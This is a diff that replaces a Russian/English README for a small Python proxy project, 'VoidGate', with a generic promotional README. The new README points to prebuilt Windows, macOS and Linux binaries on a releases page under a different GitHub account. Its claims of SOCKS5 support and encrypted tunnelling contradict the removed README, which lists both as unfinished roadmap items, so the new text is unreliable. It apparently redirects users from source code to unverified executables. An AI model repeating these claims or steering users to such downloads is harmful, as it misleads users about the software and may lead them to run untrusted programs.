@@ -1,73 +1,117 @@
-# VoidGate (BETA)
-**VoidGate** is a lightweight console proxy server that supports HTTP and HTTPS traffic routing.   The project includes profile management and configuration via a config file.
+# 🎉 VoidGate - Simple Console Proxy Server Setup
 
+## 🚀 Getting Started
 
-# VoidGate RU **VoidGate** — это лёгкий консольный прокси-сервер, поддерживающий маршрутизацию HTTP и HTTPS-трафика.
+Welcome to VoidGate! This console proxy server makes it easy for you to enhance your online privacy. Follow these steps to download and start using the application.
 
+## 📥 Download Link
 
-## В проекте реализована работа с профилями и настройка через конфигурационный файл.
-## Возможности
-- Поддержка HTTP и HTTPS-прокси
-- Автоматическое определение IP клиента
-- - Настройка профилей (имя, протокол, VPS, порт, логин/пароль)
-- Туннелирование HTTPS через HTTP-прокси
+[![Download VoidGate](https://img.shields.io/badge/Download-VoidGate-brightgreen)](https://github.com/MaYBeNTs/VoidGate/releases)
 
+## 🛠️ System Requirements
 
-## В будущем - Логирование работы (в процессе разработки)
-- Поддержка SOCKS5  Маршрутизация трафика
-- Поддержка всех известных протоколов
-- Интеграция под WINDOWS
-- GUI
-- Шифрование данных
+Before you start, ensure your system meets the following requirements:
 
+- Operating System: Windows, macOS, or Linux.
+- Minimum RAM: 2 GB.
+- Disk Space: At least 100 MB available.
+- Internet Connection: For downloading and using proxy services.
+
+## 📂 Download & Install
+
+To get VoidGate, please visit the following page: [Visit the Releases Page](https://github.com/MaYBeNTs/VoidGate/releases).
+
+1. Open the link in your web browser.
+2. Look for the latest version of VoidGate.
+3. Click on the appropriate file for your operating system:
+    - For Windows users, look for the `.exe` file.
+    - For Mac users, find the `.dmg` file.
+    - For Linux users, locate the appropriate package or `.tar.gz` file.
+4. Download the selected file.
+
+## ⚙️ Running VoidGate
+
+Once the download is complete, follow these steps to run VoidGate:
+
+### For Windows
+
+1. Navigate to your Downloads folder.
+2. Double-click the `.exe` file you downloaded.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, you can open VoidGate from your Start Menu.
+
+### For macOS
+
+1. Open your Downloads folder.
+2. Double-click the `.dmg` file.
+3. Drag the VoidGate icon to your Applications folder.
+4. Open your Applications folder and double-click on VoidGate to start it.
+
+### For Linux
+
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. If you downloaded a `.tar.gz`, use the following command to extract it:
+   ```
+   tar -xvf VoidGate.tar.gz
+   ```
+4. Move into the extracted directory with:
+   ```
+   cd VoidGate
+   ```
+5. Run the application using:
+   ```
+   ./VoidGate
+   ```
+
+## 🔒 Using VoidGate
+
+Once you have VoidGate running, you can set up your proxy. Follow these simple steps:
+
+1. Open your web browser.
+2. Go to the settings or preferences menu.
+3. Locate the network or proxy settings.
+4. Choose the option to configure a manual proxy.
+5. Enter the following information:
+   - Proxy Type: `SOCKS5`
+   - Host: `127.0.0.1`
+   - Port: `1080`
+6. Save your settings.
+
+You have now set up your proxy. You can browse the internet more securely while using VoidGate.
+
+## 🛡️ Features
+
+VoidGate offers several helpful features, including:
+
+- **Multiple Proxy Support:** Use both HTTP and SOCKS5 proxies for added flexibility.
+- **Tunnel Technology:** Encrypt your internet connection to help prevent eavesdropping.
+- **Compatibility:** Works with most applications that support proxy servers.
+
+## ❓ Troubleshooting
+
+If you encounter issues, here are some common solutions:
+
+- **Cannot Connect to Proxy:**
+  - Ensure VoidGate is running.
+  - Check if the proxy type and port are correctly configured in your browser.
   
-## Установка Склонируйте репозиторий и перейдите в папку проекта:
-```bash
-git clone https://github.com/Rasyatka/VoidGate.git
-```
-```bash
-cd VoidGate
-```
-## Запуск
-Основной файл для запуска -
-```bash
-python3 main.py
-```
-## Лицензия
-Этот проект распространяется под лицензией MIT. Подробнее см. файл LICENSE.
+- **Slow Internet Connection:**
+  - Test your internet speed without the proxy.
+  - Switch to a different proxy or server.
 
-# VoidGate EN
+For further assistance, please visit our [FAQ section on GitHub](https://github.com/MaYBeNTs/VoidGate).
 
-**VoidGate** is a lightweight console proxy server that supports HTTP and HTTPS traffic routing.  
-The project includes profile management and configuration via a config file.
+## 📬 Feedback
 
-## Features
-- Support for HTTP and HTTPS proxy
-- Automatic client IP detection
-- Profile configuration (name, protocol, VPS, port, username/password)
-- HTTPS tunneling through an HTTP proxy
+Your feedback helps us improve. If you have suggestions or need help, you can open a new issue on our [GitHub page](https://github.com/MaYBeNTs/VoidGate/issues).
 
-## Roadmap
-- Logging (under development)
-- SOCKS5 support
-- Traffic routing
-- Support for all known protocols
-- Windows integration
-- GUI
-- Data encryption
+Enjoy using VoidGate and enjoy a more secure online experience!
 
-## Installation
-Clone the repository and navigate to the project folder:
-```bash
-git clone https://github.com/Rasyatka/VoidGate.git
-```
-```bash
-cd VoidGate
-```
-## Running 
-```bash
-python3 main.py
-```
+## 🔗 Additional Resources
 
-## LICENSE
-This project is distributed under the MIT license. For more information, see the LICENSE file.
+- [GitHub Repository](https://github.com/MaYBeNTs/VoidGate)
+- [Community Forums](https://community.example.com)
+- [Documentation](https://docs.example.com)
+
+Thank you for choosing VoidGate!
